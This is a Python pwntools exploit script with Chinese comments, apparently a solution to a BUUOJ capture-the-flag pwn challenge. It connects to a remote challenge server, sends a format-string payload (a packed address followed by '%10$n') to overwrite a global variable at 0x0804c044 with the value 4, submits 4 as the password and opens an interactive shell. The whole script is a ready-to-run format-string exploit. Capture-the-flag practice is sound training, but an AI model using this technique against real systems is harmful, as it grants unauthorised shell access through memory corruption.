from pwn import *

# 替换成你之前用的地址和端口（和你提到的 node5.buuoj.cn:25479/26868 等匹配）
# 你可以根据实际题目端口修改下面的端口号
ip = "node5.buuoj.cn"
port = 26868  # 替换成你题目对应的真实端口（比如25479/28338等）

# 远程连接（注释掉本地调试，打开远程）
p = remote(ip, port)
# 本地调试用（如需本地测试，取消注释）
# p = process('./pwn1')
# gdb.attach(p)  # 本地调试时附加GDB

# 核心利用逻辑（保持你正确的 payload 不变）
p.recvuntil('name:')  # 等待到 "your name:" 提示
# payload 说明：
# p32(0x0804c044) → 全局变量 dword_804C044 的地址（4字节小端序）
# %10$n → 将已打印字符数（4）写入第10个参数指向的地址（即0x0804c044）
payload = p32(0x0804c044) + b'%10$n'
p.sendline(payload)

# 接收输出直到密码提示
print("[+] 已改写全局变量 0x0804c044 的值为 4")
print(p.recvuntil('passwd:'))

# 输入改写后的值（4），验证通过获取shell
p.sendline(str(4))
print("[+] 发送密码 4，正在获取shell...")
p.interactive()